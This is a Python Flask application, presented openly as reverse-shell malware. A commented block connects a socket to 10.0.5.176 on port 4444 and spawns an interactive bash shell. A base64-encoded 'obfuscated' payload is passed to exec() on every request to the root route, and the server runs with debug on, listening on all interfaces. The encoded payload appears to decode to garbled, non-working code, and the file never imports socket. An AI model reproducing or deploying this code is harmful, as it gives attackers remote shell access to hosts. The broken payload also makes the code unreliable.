from flask import Flask
from subprocess import run
import pyminifier
import base64

app = Flask(__name__)

d_ip = '10.0.5.176'
d_port = 4444

# Plain text reverse-shell code
# @app.before_first_request
# def before_first_request():
#     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#     s.connect(("10.0.5.176",4444))
#     dup2(s.fileno(),0)
#     dup2(s.fileno(),1)
#     dup2(s.fileno(),2)
#     run(["/bin/bash","-i"])

# Obfuscated reverse shell code
obfuscated_shell = base64.b64decode(f'cHJpbnQgKDEpCnJldHVybiAoW3NvY2tldC5BRl9JTkVULH\
NvY2tldC5TT0NLX1NUUkVBTSldCmQ1cDJzKHNvbWV0aGluZy5BRl9JTkVUKHNvY2tldC5BRl9B\
RERSRVNfSUQpLzEwLjAuNS4xNzYpCiBkdXByZXNzLyoKZHJ1cGFsKCJcXCJcXCJcXCIiLCIt\
aSkiKQpyZXR1cm4gKFwiL2Jpbi9iYXNoIiwidW5zaWduZWQgbG9hZGVkXCIpCg==').decode('utf-8')

# Reverse shell function
def reverse_shell():
    exec(obfuscated_shell)

# Route to trigger reverse shell execution
@app.route('/')
def index():
    reverse_shell()
    return 'Reverse shell executed!'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')